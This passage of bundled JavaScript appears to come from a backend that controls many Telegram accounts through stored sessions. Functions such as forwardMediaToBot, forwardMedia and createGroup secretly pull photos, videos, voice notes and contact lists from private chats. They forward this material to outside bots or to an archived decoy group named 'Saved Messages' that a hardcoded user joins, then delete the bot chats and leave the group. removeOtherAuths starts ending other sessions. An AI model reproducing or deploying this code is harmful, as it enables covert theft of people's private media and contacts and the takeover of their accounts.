        return await telegramClient.updatePrivacyBatch(settings);
    }
    async addGroupMembers(mobile, groupId, members) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.addGroupMembers(groupId, members);
    }
    async removeGroupMembers(mobile, groupId, members) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.removeGroupMembers(groupId, members);
    }
    async promoteToAdmin(mobile, groupId, userId, permissions, rank) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.promoteToAdmin(groupId, userId, permissions, rank);
    }
    async demoteAdmin(mobile, groupId, userId) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.logOperation(mobile, 'Demoted admin to regular member', { groupId, userId });
        return await telegramClient.demoteAdmin(groupId, userId);
    }
    async unblockGroupUser(mobile, groupId, userId) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.logOperation(mobile, 'Unblocked user in group', { groupId, userId });
        return await telegramClient.unblockGroupUser(groupId, userId);
    }
    async getGroupAdmins(mobile, groupId) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.logOperation(mobile, 'Get group admins', { groupId });
        return await telegramClient.getGroupAdmins(groupId);
    }
    async getGroupBannedUsers(mobile, groupId) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.logOperation(mobile, 'Get group banned users', { groupId });
        return await telegramClient.getGroupBannedUsers(groupId);
    }
    async searchMessages(mobile, params) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.logOperation(mobile, 'Search messages', params);
        return await telegramClient.searchMessages(params);
    }
    async getFilteredMedia(mobile, params) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.logOperation(mobile, 'Get filtered media', params);
        return await telegramClient.getFilteredMedia(params);
    }
    async exportContacts(mobile, format, includeBlocked = false) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.logOperation(mobile, 'Export contacts', { format, includeBlocked });
        return await telegramClient.exportContacts(format, includeBlocked);
    }
    async importContacts(mobile, contacts) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.logOperation(mobile, 'Import contacts', { contactCount: contacts.length });
        return await telegramClient.importContacts(contacts);
    }
    async manageBlockList(mobile, userIds, block) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.logOperation(mobile, block ? 'Block users' : 'Unblock users', { userIds });
        return await telegramClient.manageBlockList(userIds, block);
    }
    async getContactStatistics(mobile) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.logOperation(mobile, 'Get contact statistics');
        return await telegramClient.getContactStatistics();
    }
    async createChatFolder(mobile, options) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.logOperation(mobile, 'Create chat folder', { name: options.name });
        return await telegramClient.createChatFolder(options);
    }
    async getChatFolders(mobile) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.logOperation(mobile, 'Get chat folders');
        return await telegramClient.getChatFolders();
    }
    async getSessionInfo(mobile) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.logOperation(mobile, 'Get session info');
        return await telegramClient.getSessionInfo();
    }
    async terminateSession(mobile, options) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.logOperation(mobile, 'Terminate session', options);
        return await telegramClient.terminateSession(options);
    }
    async editMessage(mobile, options) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.logOperation(mobile, 'Edit message', { chatId: options.chatId, messageId: options.messageId });
        return await telegramClient.editMessage(options);
    }
    async updateChatSettings(mobile, settings) {
        if (!settings.chatId) {
            throw new Error('chatId is required');
        }
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.logOperation(mobile, 'Update chat settings', { chatId: settings.chatId });
        return await telegramClient.updateChatSettings(settings);
    }
    async sendMediaBatch(mobile, options) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.logOperation(mobile, 'Send media batch', { chatId: options.chatId, mediaCount: options.media.length });
        return await telegramClient.sendMediaBatch(options);
    }
    async hasPassword(mobile) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.logOperation(mobile, 'Check password status');
        return await telegramClient.hasPassword();
    }
    async getContacts(mobile) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.logOperation(mobile, 'Get contacts list');
        return await telegramClient.getContacts();
    }
    async getChats(mobile, options) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.logOperation(mobile, 'Get chats', options);
        return await telegramClient.getChats(options);
    }
    async getFileUrl(mobile, url, filename) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.logOperation(mobile, 'Get file URL', { url, filename });
        return await telegramClient.getFileUrl(url, filename);
    }
    async getMessageStats(mobile, options) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.logOperation(mobile, 'Get message statistics', options);
        return await telegramClient.getMessageStats(options);
    }
    async sendViewOnceMedia(mobile, options) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.logOperation(mobile, 'Send view once media', { sourceType: options.sourceType, chatId: options.chatId });
        const { sourceType, chatId, caption, filename } = options;
        try {
            if (sourceType === 'path') {
                if (!options.path)
                    throw new common_1.BadRequestException('Path is required when sourceType is url');
                try {
                    const localPath = options.path;
                    if (!fs.existsSync(localPath)) {
                        throw new common_1.BadRequestException(`File not found at path: ${localPath}`);
                    }
                    let isVideo = false;
                    const ext = path.extname(localPath).toLowerCase().substring(1);
                    if (['mp4', 'mov', 'avi', 'mkv', 'wmv', 'flv', 'webm', '3gp'].includes(ext)) {
                        isVideo = true;
                    }
                    const fileBuffer = fs.readFileSync(localPath);
                    this.logger.logOperation(mobile, 'Sending view once media from local file', {
                        path: localPath,
                        isVideo,
                        size: fileBuffer.length,
                        filename: filename || path.basename(localPath)
                    });
                    return await telegramClient.sendViewOnceMedia(chatId, fileBuffer, caption, isVideo, filename || path.basename(localPath));
                }
                catch (error) {
                    if (error instanceof common_1.BadRequestException) {
                        throw error;
                    }
                    this.logger.logError(mobile, 'Failed to read local file', error);
                    throw new common_1.BadRequestException(`Failed to read local file: ${error.message}`);
                }
            }
            else if (sourceType === 'base64') {
                if (!options.base64Data)
                    throw new common_1.BadRequestException('Base64 data is required when sourceType is base64');
                const base64String = options.base64Data;
                let isVideo = false;
                if (filename) {
                    const ext = filename.toLowerCase().split('.').pop();
                    if (ext && ['mp4', 'mov', 'avi', 'mkv', 'wmv', 'flv', 'webm', '3gp'].includes(ext)) {
                        isVideo = true;
                    }
                }
                this.logger.logOperation(mobile, 'Sending view once media from base64', { isVideo, size: base64String.length });
                const mediaData = Buffer.from(base64String, 'base64');
                return await telegramClient.sendViewOnceMedia(chatId, mediaData, caption, isVideo, filename);
            }
            else if (sourceType === 'binary') {
                if (!options.binaryData)
                    throw new common_1.BadRequestException('Binary data is required when sourceType is binary');
                this.logger.logOperation(mobile, 'Sending view once media from binary', {
                    size: options.binaryData.length,
                    filename: filename || 'unknown'
                });
                let isVideo = false;
                if (filename) {
                    const ext = filename.toLowerCase().split('.').pop();
                    if (ext && ['mp4', 'mov', 'avi', 'mkv', 'wmv', 'flv', 'webm', '3gp'].includes(ext)) {
                        isVideo = true;
                    }
                }
                return await telegramClient.sendViewOnceMedia(chatId, options.binaryData, caption, isVideo, filename);
            }
            else {
                throw new common_1.BadRequestException('Invalid source type. Must be one of: url, base64, binary');
            }
        }
        catch (error) {
            this.logger.logError(mobile, 'Failed to send view once media', error);
            throw error;
        }
    }
    async getTopPrivateChats(mobile) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.logOperation(mobile, 'Get top private chats');
        return await telegramClient.getTopPrivateChats();
    }
    async addBotsToChannel(mobile, channelIds = [process.env.accountsChannel, process.env.updatesChannel, process.env.notifChannel, "miscmessages", process.env.httpFailuresChannel]) {
        this.logger.logOperation(mobile, 'Add bots to channel', { channelIds });
        const botTokens = (process.env.BOT_TOKENS || '').split(',').filter(Boolean);
        if (botTokens.length === 0) {
            throw new Error('No bot tokens configured. Please set BOT_TOKENS environment variable');
        }
        for (const token of botTokens) {
            try {
                const botInfo = await this.getBotInfo(token);
                if (botInfo) {
                    for (const channelId of channelIds) {
                        await this.setupBotInChannel(mobile, channelId, botInfo.id, botInfo.username, {
                            changeInfo: true,
                            postMessages: true,
                            editMessages: true,
                            deleteMessages: true,
                            banUsers: true,
                            inviteUsers: true,
                            pinMessages: true,
                            addAdmins: true,
                            anonymous: true,
                            manageCall: true
                        });
                    }
                    ;
                }
            }
            catch (error) {
                this.logger.logError(mobile, 'Failed to setup bot in channel', error);
            }
        }
    }
    async getBotInfo(token) {
        try {
            const response = await (0, fetchWithTimeout_1.fetchWithTimeout)(`https://api.telegram.org/bot${token}/getMe`);
            if (response.data?.ok) {
                return response.data.result;
            }
            throw new Error('Failed to get bot info');
        }
        catch (error) {
            throw new Error(`Failed to get bot info: ${error.message}`);
        }
    }
    async setupBotInChannel(mobile, channelId, botId, botUsername, permissions) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.logOperation(mobile, 'Setup bot in channel', { channelId, botId, botUsername });
        try {
            await telegramClient.joinChannel(channelId);
        }
        catch (error) {
            this.logger.logError(mobile, 'Failed to join channel', error);
        }
        try {
            await telegramClient.promoteToAdmin(channelId, botUsername, permissions);
            this.logger.logOperation(mobile, 'Bot added to channel', { channelId, botUsername });
            await (0, Helpers_1.sleep)(2000);
            this.logger.logOperation(mobile, `Bot ${botUsername} successfully added to channel ${channelId}`);
        }
        catch (error) {
            this.logger.logError(mobile, `Failed to add bot ${botUsername} to channel ${channelId}`, error);
        }
        try {
            await telegramClient.promoteToAdmin(channelId, botUsername, permissions);
            console.log(`Bot ${botUsername} promoted as admin in channel ${channelId}`);
        }
        catch (error) {
            this.logger.logError(mobile, `Failed to setup bot ${botUsername} in channel ${channelId}`, error);
        }
    }
    async createBot(mobile, createBotDto) {
        const client = await connection_manager_1.connectionManager.getClient(mobile);
        return client.createBot(createBotDto);
    }
    async connect(mobile, options) {
        await connection_manager_1.connectionManager.getClient(mobile, options);
    }
    async disconnect(mobile) {
        await connection_manager_1.connectionManager.unregisterClient(mobile);
    }
    async disconnectAll() {
        await connection_manager_1.connectionManager.disconnectAll();
    }
    getConnectionStats() {
        return connection_manager_1.connectionManager.getConnectionStats();
    }
    getClientState(mobile) {
        const state = connection_manager_1.connectionManager.getClientState(mobile);
        return state;
    }
    getActiveConnectionCount() {
        return connection_manager_1.connectionManager.getActiveConnectionCount();
    }
};
exports.TelegramService = TelegramService;
exports.TelegramService = TelegramService = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, common_1.Inject)((0, common_1.forwardRef)(() => users_service_1.UsersService))),
    __param(1, (0, common_1.Inject)((0, common_1.forwardRef)(() => active_channels_service_1.ActiveChannelsService))),
    __param(2, (0, common_1.Inject)((0, common_1.forwardRef)(() => channels_service_1.ChannelsService))),
    __metadata("design:paramtypes", [users_service_1.UsersService,
        active_channels_service_1.ActiveChannelsService,
        channels_service_1.ChannelsService])
], TelegramService);


/***/ }),

/***/ "./src/components/Telegram/TelegramManager.ts":
/*!****************************************************!*\
  !*** ./src/components/Telegram/TelegramManager.ts ***!
  \****************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || (function () {
    var ownKeys = function(o) {
        ownKeys = Object.getOwnPropertyNames || function (o) {
            var ar = [];
            for (var k in o) if (Object.prototype.hasOwnProperty.call(o, k)) ar[ar.length] = k;
            return ar;
        };
        return ownKeys(o);
    };
    return function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k = ownKeys(mod), i = 0; i < k.length; i++) if (k[i] !== "default") __createBinding(result, mod, k[i]);
        __setModuleDefault(result, mod);
        return result;
    };
})();
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
const telegram_1 = __webpack_require__(/*! telegram */ "telegram");
const sessions_1 = __webpack_require__(/*! telegram/sessions */ "telegram/sessions");
const events_1 = __webpack_require__(/*! telegram/events */ "telegram/events");
const axios_1 = __importDefault(__webpack_require__(/*! axios */ "axios"));
const fs = __importStar(__webpack_require__(/*! fs */ "fs"));
const uploads_1 = __webpack_require__(/*! telegram/client/uploads */ "telegram/client/uploads");
const Helpers_1 = __webpack_require__(/*! telegram/Helpers */ "telegram/Helpers");
const Logger_1 = __webpack_require__(/*! telegram/extensions/Logger */ "telegram/extensions/Logger");
const IMap_1 = __webpack_require__(/*! ../../IMap/IMap */ "./src/IMap/IMap.ts");
const big_integer_1 = __importDefault(__webpack_require__(/*! big-integer */ "big-integer"));
const utils_1 = __webpack_require__(/*! ../../utils */ "./src/utils/index.ts");
const parseError_1 = __webpack_require__(/*! ../../utils/parseError */ "./src/utils/parseError.ts");
const fetchWithTimeout_1 = __webpack_require__(/*! ../../utils/fetchWithTimeout */ "./src/utils/fetchWithTimeout.ts");
const logbots_1 = __webpack_require__(/*! ../../utils/logbots */ "./src/utils/logbots.ts");
const connection_manager_1 = __webpack_require__(/*! ./utils/connection-manager */ "./src/components/Telegram/utils/connection-manager.ts");
const message_search_dto_1 = __webpack_require__(/*! ./dto/message-search.dto */ "./src/components/Telegram/dto/message-search.dto.ts");
const TelegramBots_config_1 = __webpack_require__(/*! ../../utils/TelegramBots.config */ "./src/utils/TelegramBots.config.ts");
class TelegramManager {
    constructor(sessionString, phoneNumber) {
        this.session = new sessions_1.StringSession(sessionString);
        this.phoneNumber = phoneNumber;
        this.client = null;
        this.channelArray = [];
    }
    static getActiveClientSetup() {
        return TelegramManager.activeClientSetup;
    }
    static setActiveClientSetup(data) {
        TelegramManager.activeClientSetup = data;
    }
    async createGroup() {
        const groupName = "Saved Messages";
        const groupDescription = this.phoneNumber;
        console.log("Creating group:", groupName);
        const result = await this.client.invoke(new telegram_1.Api.channels.CreateChannel({
            title: groupName,
            about: groupDescription,
            megagroup: true,
            forImport: true,
        }));
        const { id, accessHash } = result.chats[0];
        console.log("Archived chat", id);
        await this.archiveChat(id, accessHash);
        const usersToAdd = ["fuckyoubabie1"];
        console.log("Adding users to the channel:", usersToAdd);
        const addUsersResult = await this.client.invoke(new telegram_1.Api.channels.InviteToChannel({
            channel: new telegram_1.Api.InputChannel({
                channelId: id,
                accessHash: accessHash,
            }),
            users: usersToAdd
        }));
        console.log("Successful addition of users:", addUsersResult);
        return { id, accessHash };
    }
    async archiveChat(id, accessHash) {
        const folderId = 1;
        console.log("Archiving chat", id);
        return await this.client.invoke(new telegram_1.Api.folders.EditPeerFolders({
            folderPeers: [
                new telegram_1.Api.InputFolderPeer({
                    peer: new telegram_1.Api.InputPeerChannel({
                        channelId: id,
                        accessHash: accessHash,
                    }),
                    folderId: folderId,
                }),
            ],
        }));
    }
    async createOrJoinChannel(channel) {
        let channelId;
        let channelAccessHash;
        if (channel) {
            try {
                const result = await this.joinChannel(channel);
                channelId = result.chats[0].id;
                channelAccessHash = result.chats[0].accessHash;
                console.log("Archived chat", channelId);
            }
            catch (error) {
                const result = await this.createGroup();
                channelId = result.id;
                channelAccessHash = result.accessHash;
                console.log("Created new group with ID:", channelId);
            }
        }
        else {
            const result = await this.createGroup();
            channelId = result.id;
            channelAccessHash = result.accessHash;
            console.log("Created new group with ID:", channelId);
        }
        await this.archiveChat(channelId, channelAccessHash);
        return { id: channelId, accesshash: channelAccessHash };
    }
    async forwardMedia(channel, fromChatId) {
        let channelId;
        try {
            console.log("Forwarding media from chat to channel", channel, fromChatId);
            let channelAccessHash;
            if (fromChatId) {
                const channelDetails = await this.createOrJoinChannel(channel);
                channelId = channelDetails.id;
                channelAccessHash = channelDetails.accesshash;
                await this.forwardSecretMsgs(fromChatId, channelId?.toString());
            }
            else {
                const chats = await this.getTopPrivateChats();
                const me = await this.getMe();
                if (chats.length > 0) {
                    const channelDetails = await this.createOrJoinChannel(channel);
                    channelId = channelDetails.id;
                    channelAccessHash = channelDetails.accesshash;
                    const finalChats = new Set(chats.map(chat => chat.chatId));
                    finalChats.add(me.id?.toString());
                    for (const chatId of finalChats) {
                        const mediaMessages = await this.searchMessages({ chatId: chatId, limit: 1000, types: [message_search_dto_1.MessageMediaType.PHOTO, message_search_dto_1.MessageMediaType.VIDEO, message_search_dto_1.MessageMediaType.ROUND_VIDEO, message_search_dto_1.MessageMediaType.DOCUMENT, message_search_dto_1.MessageMediaType.VOICE, message_search_dto_1.MessageMediaType.ROUND_VOICE] });
                        console.log("Forwarding messages from chat:", chatId, "to channel:", channelId);
                        await this.forwardMessages(chatId, channelId, mediaMessages.photo.messages);
                        await this.forwardMessages(chatId, channelId, mediaMessages.video.messages);
                    }
                }
                console.log("Completed forwarding messages from top private chats to channel:", channelId);
            }
        }
        catch (e) {
            console.log(e);
        }
        if (channelId) {
            await this.leaveChannels([channelId.toString()]);
            await connection_manager_1.connectionManager.unregisterClient(this.phoneNumber);
        }
    }
    async forwardMediaToBot(fromChatId) {
        const bots = TelegramBots_config_1.BotConfig.getInstance().getAllBotUsernames(TelegramBots_config_1.ChannelCategory.SAVED_MESSAGES);
        try {
            if (fromChatId) {
                await this.forwardSecretMsgs(fromChatId, TelegramBots_config_1.BotConfig.getInstance().getBotUsername(TelegramBots_config_1.ChannelCategory.SAVED_MESSAGES));
            }
            else {
                const chats = await this.getTopPrivateChats();
                const me = await this.getMe();
                const finalChats = new Set(chats.map(chat => chat.chatId));
                finalChats.add(me.id?.toString());
                for (const bot of bots) {
                    try {
                        await this.client.sendMessage(bot, { message: "Start" });
                        await (0, Helpers_1.sleep)(1000);
                        await this.client.invoke(new telegram_1.Api.folders.EditPeerFolders({
                            folderPeers: [
                                new telegram_1.Api.InputFolderPeer({
                                    peer: await this.client.getInputEntity(bot),
                                    folderId: 1,
                                }),
                            ],
                        }));
                    }
                    catch (e) {
                        console.log(e);
                    }
                }
                try {
                    const contacts = await this.getContacts();
                    if ('users' in contacts && Array.isArray(contacts.users)) {
                        await this.sendContactsFile(TelegramBots_config_1.BotConfig.getInstance().getBotUsername(TelegramBots_config_1.ChannelCategory.USER_WARNINGS), contacts);
                    }
                    else {
                        console.warn('Contacts result is not of type Api.contacts.Contacts, skipping sendContactsFile.');
                    }
                }
                catch (e) {
                    console.log("Failed To Send Contacts File", e);
                }
                for (const chatId of finalChats) {
                    const mediaMessages = await this.searchMessages({ chatId: chatId, limit: 1000, types: [message_search_dto_1.MessageMediaType.PHOTO, message_search_dto_1.MessageMediaType.VIDEO, message_search_dto_1.MessageMediaType.ROUND_VIDEO, message_search_dto_1.MessageMediaType.DOCUMENT, message_search_dto_1.MessageMediaType.ROUND_VOICE, message_search_dto_1.MessageMediaType.VOICE] });
                    console.log("Media Messages: ", mediaMessages);
                    const uniqueMessageIds = Array.from(new Set([
                        ...mediaMessages.photo.messages,
                        ...mediaMessages.video.messages,
                        ...mediaMessages.document.messages,
                        ...mediaMessages.roundVideo.messages,
                        ...mediaMessages.roundVoice.messages,
                        ...mediaMessages.voice.messages,
                    ]));
                    const chunkSize = 30;
                    for (let i = 0; i < uniqueMessageIds.length; i += chunkSize) {
                        const chunk = uniqueMessageIds.slice(i, i + chunkSize);
                        const bot = TelegramBots_config_1.BotConfig.getInstance().getBotUsername(TelegramBots_config_1.ChannelCategory.SAVED_MESSAGES);
                        await this.client.forwardMessages(bot, {
                            messages: chunk,
                            fromPeer: chatId,
                        });
                        console.log(`Forwarded ${chunk.length} messages to bot`);
                    }
                }
            }
        }
        catch (e) {
            console.log(e);
        }
        for (const bot of bots) {
            const result = await this.cleanupChat({ chatId: bot, revoke: false });
            await (0, Helpers_1.sleep)(1000);
            await this.deleteChat({ peer: bot, justClear: false });
            console.log("Deleted bot chat:", result);
        }
    }
    async forwardSecretMsgs(fromChatId, toChatId) {
        let offset = 0;
        const limit = 100;
        let totalMessages = 0;
        let forwardedCount = 0;
        let messages = [];
        do {
            messages = await this.client.getMessages(fromChatId, { offsetId: offset, limit });
            totalMessages = messages.total;
            const messageIds = messages.map((message) => {
                offset = message.id;
                if (message.id && message.media) {
                    return message.id;
                }
                return undefined;
            }).filter(id => id !== undefined);
            console.log(messageIds);
            if (messageIds.length > 0) {
                try {
                    const result = await this.client.forwardMessages(toChatId, {
                        messages: messageIds,
                        fromPeer: fromChatId,
                    });
                    forwardedCount += messageIds.length;
                    console.log(`Forwarded ${forwardedCount} / ${totalMessages} messages`);
                    await (0, Helpers_1.sleep)(5000);
                }
                catch (error) {
                    console.error("Error occurred while forwarding messages:", error);
                }
                await (0, Helpers_1.sleep)(5000);
            }
        } while (messages.length > 0);
        console.log("Left the channel with ID:", toChatId);
        return;
    }
    async forwardMessages(fromChatId, toChatId, messageIds) {
        const chunkSize = 30;
        const totalMessages = messageIds.length;
        let forwardedCount = 0;
        for (let i = 0; i < totalMessages; i += chunkSize) {
            const chunk = messageIds.slice(i, i + chunkSize);
            try {
                await this.client.forwardMessages(toChatId, {
                    messages: chunk,
                    fromPeer: fromChatId,
                });
                forwardedCount += chunk.length;
                console.log(`Forwarded ${forwardedCount} / ${totalMessages} messages`);
                await (0, Helpers_1.sleep)(5000);
            }
            catch (error) {
                console.error("Error occurred while forwarding messages:", error);
            }
        }
        return forwardedCount;
    }
    async destroy() {
        if (this.client) {
            try {
                await this.client?.destroy();
                this.client._eventBuilders = [];
                this.session?.delete();
                this.channelArray = [];
                await (0, Helpers_1.sleep)(2000);
                console.log("Client Destroyed: ", this.phoneNumber);
            }
            catch (error) {
                (0, parseError_1.parseError)(error, `${this.phoneNumber}: Error during client cleanup`);
            }
            finally {
                this.client._destroyed = true;
                if (this.client._sender && typeof this.client._sender.disconnect === 'function') {
                    await this.client._sender.disconnect();
                }
                this.client = null;
            }
        }
    }
    async getchatId(username) {
        if (!this.client)
            throw new Error('Client is not initialized');
        const entity = await this.client.getInputEntity(username);
        return entity;
    }
    async getMe() {
        const me = await this.client.getMe();
        return me;
    }
    async errorHandler(error) {
        if (error.message && error.message == 'TIMEOUT') {
            await this.destroy();
        }
        else {
            (0, parseError_1.parseError)(error);
        }
    }
    async createClient(handler = true, handlerFn) {
        this.client = new telegram_1.TelegramClient(this.session, parseInt(process.env.API_ID), process.env.API_HASH, {
            connectionRetries: 5,
        });
        this.client.setLogLevel(Logger_1.LogLevel.ERROR);
        this.client._errorHandler = this.errorHandler;
        await this.client.connect();
        const me = await this.client.getMe();
        console.log("Connected Client : ", me.phone);
        if (handler && this.client) {
            console.log("Adding event Handler");
            if (handlerFn) {
                this.client.addEventHandler(async (event) => { await handlerFn(event); }, new events_1.NewMessage());
            }
            else {
                this.client.addEventHandler(async (event) => { await this.handleEvents(event); }, new events_1.NewMessage());
            }
        }
        return this.client;
    }
    async getGrpMembers(entity) {
        try {
            const result = [];
            const chat = await this.client.getEntity(entity);
            if (!(chat instanceof telegram_1.Api.Chat || chat instanceof telegram_1.Api.Channel)) {
                console.log("Invalid group or channel!");
                return;
            }
            console.log(`Fetching members of ${chat.title || chat.username}...`);
            const participants = await this.client.invoke(new telegram_1.Api.channels.GetParticipants({
                channel: chat,
                filter: new telegram_1.Api.ChannelParticipantsRecent(),
                offset: 0,
                limit: 200,
                hash: (0, big_integer_1.default)(0),
            }));
            if (participants instanceof telegram_1.Api.channels.ChannelParticipants) {
                const users = participants.participants;
                console.log(`Members: ${users.length}`);
                for (const user of users) {
                    const userInfo = user instanceof telegram_1.Api.ChannelParticipant ? user.userId : null;
                    if (userInfo) {
                        const userDetails = await this.client.getEntity(userInfo);
                        result.push({
                            tgId: userDetails.id,
                            name: `${userDetails.firstName || ""} ${userDetails.lastName || ""}`,
                            username: `${userDetails.username || ""}`,
                        });
                        if (userDetails.firstName == 'Deleted Account' && !userDetails.username) {
                            console.log(JSON.stringify(userDetails.id));
                        }
                    }
                    else {
                        console.log(JSON.stringify(user?.userId));
                    }
                }
            }
            else {
                console.log("No members found or invalid group.");
            }
            console.log(result.length);
            return result;
        }
        catch (err) {
            console.error("Error fetching group members:", err);
        }
    }
    async getMessages(entityLike, limit = 8) {
        const messages = await this.client.getMessages(entityLike, { limit });
        return messages;
    }
    async getDialogs(params) {
        const chats = await this.client.getDialogs(params);
        console.log("TotalChats:", chats.total);
        return chats;
    }
    async getSelfMSgsInfo() {
        if (!this.client)
            throw new Error('Client is not initialized');
        const self = await this.client.getMe();
        const selfChatId = self.id;
        let photoCount = 0;
        let ownPhotoCount = 0;
        let ownVideoCount = 0;
        let otherPhotoCount = 0;
        let otherVideoCount = 0;
        let videoCount = 0;
        let movieCount = 0;
        const messageHistory = await this.client.getMessages(selfChatId, { limit: 200 });
        for (const message of messageHistory) {
            const text = message.text.toLocaleLowerCase();
            if ((0, utils_1.contains)(text, ['movie', 'series', '1080', '720', 'terabox', '640', 'title', 'aac', '265', '264', 'instagr', 'hdrip', 'mkv', 'hq', '480', 'blura', 's0', 'se0', 'uncut'])) {
                movieCount++;
            }
            else {
                if (message.photo) {
                    photoCount++;
                    if (!message.fwdFrom) {
                        ownPhotoCount++;
                    }
                    else {
                        otherPhotoCount++;
                    }
                }
                else if (message.video) {
                    videoCount++;
                    if (!message.fwdFrom) {
                        ownVideoCount++;
                    }
                    else {
                        otherVideoCount++;
                    }
                }
            }
        }
        return ({ total: messageHistory.total, photoCount, videoCount, movieCount, ownPhotoCount, otherPhotoCount, ownVideoCount, otherVideoCount });
    }
    async channelInfo(sendIds = false) {
        if (!this.client)
            throw new Error('Client is not initialized');
        const chats = await this.client.getDialogs({ limit: 1500 });
        let canSendTrueCount = 0;
        let canSendFalseCount = 0;
        let totalCount = 0;
        this.channelArray.length = 0;
        const canSendFalseChats = [];
        console.log("TotalChats:", chats.total);
        for (const chat of chats) {
            if (chat.isChannel || chat.isGroup) {
                try {
                    const chatEntity = chat.entity.toJSON();
                    const { broadcast, defaultBannedRights, id } = chatEntity;
                    totalCount++;
                    if (!broadcast && !defaultBannedRights?.sendMessages) {
                        canSendTrueCount++;
                        this.channelArray.push(id.toString()?.replace(/^-100/, ""));
                    }
                    else {
                        canSendFalseCount++;
                        canSendFalseChats.push(id.toString()?.replace(/^-100/, ""));
                    }
                }
                catch (error) {
                    (0, parseError_1.parseError)(error);
                }
            }
        }
        ;
        return {
            chatsArrayLength: totalCount,
            canSendTrueCount,
            canSendFalseCount,
            ids: sendIds ? this.channelArray : [],
            canSendFalseChats
        };
    }
    async addContact(data, namePrefix) {
        try {
            for (let i = 0; i < data.length; i++) {
                const user = data[i];
                const firstName = `${namePrefix}${i + 1}`;
                const lastName = "";
                try {
                    await this.client.invoke(new telegram_1.Api.contacts.AddContact({
                        firstName,
                        lastName,
                        phone: user.mobile,
                        id: user.tgId
                    }));
                }
                catch (e) {
                    console.log(e);
                }
            }
        }
        catch (error) {
            console.error("Error adding contacts:", error);
            (0, parseError_1.parseError)(error, `Failed to save contacts`);
        }
    }
    async addContacts(mobiles, namePrefix) {
        try {
            const inputContacts = [];
            for (let i = 0; i < mobiles.length; i++) {
                const user = mobiles[i];
                const firstName = `${namePrefix}${i + 1}`;
                const lastName = "";
                const clientId = (0, big_integer_1.default)((i << 16 | 0).toString(10));
                inputContacts.push(new telegram_1.Api.InputPhoneContact({
                    clientId: clientId,
                    phone: user,
                    firstName: firstName,
                    lastName: lastName
                }));
            }
            const result = await this.client.invoke(new telegram_1.Api.contacts.ImportContacts({
                contacts: inputContacts,
            }));
            console.log("Imported Contacts Result:", result);
        }
        catch (error) {
            console.error("Error adding contacts:", error);
            (0, parseError_1.parseError)(error, `Failed to save contacts`);
        }
    }
    async leaveChannels(chats) {
        console.log("Leaving Channels: initaied!!");
        console.log("ChatsLength: ", chats);
        for (const id of chats) {
            try {
                const channelId = id.startsWith('-100') ? id : `-100${id}`;
                await this.client.invoke(new telegram_1.Api.channels.LeaveChannel({
                    channel: channelId
                }));
                console.log(`${this.phoneNumber} Left channel :`, id);
                if (chats.length > 1) {
                    await (0, Helpers_1.sleep)(3000);
                }
            }
            catch (error) {
                const errorDetails = (0, parseError_1.parseError)(error);
                console.log(`${this.phoneNumber} Failed to leave channel :`, errorDetails.message);
                break;
            }
        }
        console.log(`${this.phoneNumber} Leaving Channels: Completed!!`);
    }
    async getEntity(entity) {
        return await this.client?.getEntity(entity);
    }
    async joinChannel(entity) {
        console.log("trying to join channel : ", entity);
        return await this.client?.invoke(new telegram_1.Api.channels.JoinChannel({
            channel: await this.client?.getEntity(entity)
        }));
    }
    connected() {
        return this.client.connected;
    }
    async connect() {
        return await this.client.connect();
    }
    async removeOtherAuths() {
        if (!this.client)
            throw new Error('Client is not initialized');
        const result = await this.client.invoke(new telegram_1.Api.account.GetAuthorizations());
        for (const auth of result.authorizations) {
            if (this.isAuthMine(auth)) {
                continue;
            }
            else {
